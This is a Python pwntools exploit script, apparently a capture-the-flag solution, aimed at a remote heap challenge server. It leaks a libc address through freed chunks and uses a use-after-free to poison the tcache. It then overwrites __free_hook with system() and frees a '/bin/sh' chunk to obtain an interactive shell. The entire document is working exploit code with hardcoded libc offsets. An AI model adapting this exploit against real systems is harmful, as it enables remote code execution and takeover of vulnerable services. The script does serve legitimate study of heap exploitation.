from pwn import p64, ELF, context, remote, process, log, u64

context.log_level='debug'
r = remote('chall.ehax.tech', 1925)
# context.binary = binary = ELF('./chall', False)
# r = process()

def malloc(idx, sze, payload):
    r.recvuntil('> ')
    r.sendline(b'1')

    # Index
    r.recvuntil('> ')
    r.sendline(idx)

    # Size
    r.recvuntil('> ')
    r.sendline(sze)

    # Payload
    r.recvuntil('> ')
    r.sendline(payload)

def free(idx):
    r.recvuntil('> ')
    r.sendline(b'2')

    # Index
    r.recvuntil('> ')
    r.sendline(idx)

def edit(idx, cnt):
    r.recvuntil('> ')
    r.sendline(b'3')

    # Index
    r.recvuntil('> ')
    r.sendline(idx)

    # Content
    r.recvuntil('> ')
    r.sendline(cnt)

def view(idx):
    r.recvuntil('> ')
    r.sendline(b'4')

    # Index
    r.recvuntil('> ')
    r.sendline(idx)

### Trigger malloc_consolidate() to leak libc's address
for i in range(9):
    malloc(str(i), b'145', b'')

for i in range(9):
    free(str(i))

view(b'7')
libc_leak = u64(r.recv(6).ljust(8, b'\x00').strip())
libcBase_addr = libc_leak - 0x1ecbe0
freeHook_addr = libcBase_addr + 0x1eee48
system_addr = libcBase_addr + 0x52290

log.info(f'Address of leaked libc: {hex(libc_leak)}')
log.info(f'Address of libc base: {hex(libcBase_addr)}')
log.info(f'Address of __free_hook(): {hex(freeHook_addr)}')

# UAF to make the chunk pointer to __free_hook()
malloc(b'9', b'10', b'')
malloc(b'10', b'10', b'')
free(b'9')
free(b'10')
edit(b'10', p64(freeHook_addr))

# Overwrite __free_hook() with system() and get shell
malloc(b'11', b'10', b'/bin/sh')
malloc(b'12', b'10', b'')
edit(b'12', p64(system_addr))
free(b'11')

r.interactive()